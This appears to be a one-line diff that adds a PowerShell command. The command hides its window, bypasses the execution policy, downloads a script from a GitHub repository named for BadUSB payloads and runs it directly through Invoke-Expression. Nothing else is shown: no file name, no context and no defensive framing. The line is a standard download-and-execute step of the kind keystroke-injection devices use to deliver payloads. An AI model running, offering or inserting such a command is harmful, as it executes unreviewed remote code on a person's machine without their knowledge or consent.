@@ -1,0 +1,1 @@
+powershell -nop -w h -ep bypass -c "irm 'https://raw.githubusercontent.com/ReAndrew/BadUSB_pws/refs/heads/main/WindowDance-1.ps1'|iex"
